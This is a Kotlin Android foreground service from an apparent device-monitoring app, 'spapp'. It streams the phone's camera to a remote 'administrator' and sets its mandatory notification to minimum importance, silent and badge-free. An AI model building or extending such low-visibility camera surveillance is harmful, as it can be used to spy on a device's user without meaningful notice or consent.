package com.spapp.monitoring.camerastream

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.spapp.monitoring.R
import com.spapp.monitoring.data.DeviceState

/**
 * Foreground Service for live camera streaming.
 *
 * Android (API 28+) strictly blocks background apps from accessing the camera sensor
 * unless running as a Foreground Service with FOREGROUND_SERVICE_TYPE_CAMERA.
 */
class CameraStreamService : Service() {

    companion object {
        private const val TAG = "CameraStreamService"
        private const val NOTIFICATION_ID = 2002
        private const val CHANNEL_ID = "spapp_camera_stream_channel"

        const val ACTION_START = "com.spapp.monitoring.action.START_CAMERA"
        const val ACTION_STOP = "com.spapp.monitoring.action.STOP_CAMERA"
        const val EXTRA_LENS = "extra_lens"

        fun start(context: Context, lens: String = "back") {
            val intent = Intent(context, CameraStreamService::class.java).apply {
                action = ACTION_START
                putExtra(EXTRA_LENS, lens)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stop(context: Context) {
            val intent = Intent(context, CameraStreamService::class.java).apply {
                action = ACTION_STOP
            }
            context.startService(intent)
        }
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.action ?: ACTION_START

        if (action == ACTION_STOP) {
            Log.d(TAG, "Stopping camera stream service")
            CameraStreamManager.stopStreaming()
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        val lens = intent?.getStringExtra(EXTRA_LENS) ?: "back"
        val notification = buildNotification(lens)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            } else {
                startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            }
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        val state = DeviceState(applicationContext)
        val authToken = state.authToken
        val deviceId = state.getEffectiveDeviceId()

        if (authToken != null && deviceId != null) {
            Log.d(TAG, "Starting camera stream with lens: $lens")
            CameraStreamManager.startStreaming(
                context = applicationContext,
                authToken = authToken,
                deviceId = deviceId,
                initialLens = lens,
                onStreamStopped = {
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                }
            )
        } else {
            Log.w(TAG, "Missing auth token or device ID — stopping camera stream service")
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
        }

        return START_NOT_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        CameraStreamManager.stopStreaming()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Camera Streaming Service",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Ongoing camera streaming notification"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(lens: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Live Camera Stream")
            .setContentText("Streaming $lens camera feed to administrator")
            .setSmallIcon(R.mipmap.ic_launcher)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setSilent(true)
            .setSound(null)
            .setVibrate(null)
            .setOngoing(true)
            .build()
    }
}
